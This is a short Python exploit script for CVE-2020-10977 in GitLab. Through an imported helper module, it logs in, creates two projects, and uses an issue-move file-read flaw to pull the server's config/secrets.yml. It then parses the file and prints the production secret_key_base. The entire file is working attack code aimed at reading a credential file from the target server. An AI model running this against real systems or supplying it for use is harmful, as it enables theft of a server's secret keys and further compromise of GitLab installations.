import sys
import yaml
sys.path.insert(1, 'cve-2020-10977')
import cve_2020_10977 as cve

secrets_path = '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml'

cve.login()
for project in cve.project_names:
    cve.create_project(project)

cve.create_issue(cve.project_names[0], secrets_path)
contents = cve.move_issue(cve.project_names[0], cve.project_names[1], secrets_path)

data = yaml.load(contents, Loader=yaml.FullLoader)
secret_key_base = data['production']['secret_key_base']

print('[!] Got secret key:', secret_key_base)
